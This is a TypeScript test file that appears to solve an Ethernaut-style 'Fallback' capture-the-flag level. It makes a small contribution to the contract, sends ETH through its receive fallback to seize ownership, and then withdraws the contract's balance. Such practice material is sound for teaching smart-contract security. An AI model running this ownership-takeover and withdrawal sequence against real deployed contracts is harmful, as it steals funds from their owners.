import { expect } from "chai";
import { Contract, Signer, utils } from "ethers";
import { FALLBACK_LEVEL_ADDRESS } from "./constants";
import { TestOptions, setupChallenge, submitLevel } from "./utils";

describe("Fallback", () => {
  let eoa: Signer;
  let challenge: Contract;

  before(async () => {
    const contractLevel = FALLBACK_LEVEL_ADDRESS;
    const contractName = "Fallback";
    const options: TestOptions = { contractName };
    ({ eoa, challenge } = await setupChallenge(contractLevel, options));
  });

  it("solves the challenge", async () => {
    const value = utils.parseEther("0.0001");
    // send to payable contribute
    await challenge.contribute({ value });
    // check contribution is greater than 0
    const contribution = await challenge.getContribution();
    expect(contribution).is.equal(value);
    // send some ETH to contract via the receive fallback function to claim the contract
    await eoa.sendTransaction({ to: challenge.address, value });
    expect(await challenge.owner()).to.equal(await eoa.getAddress());
    // withdraw balance once we are the owner
    await challenge.withdraw();
  });

  after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
  });
});
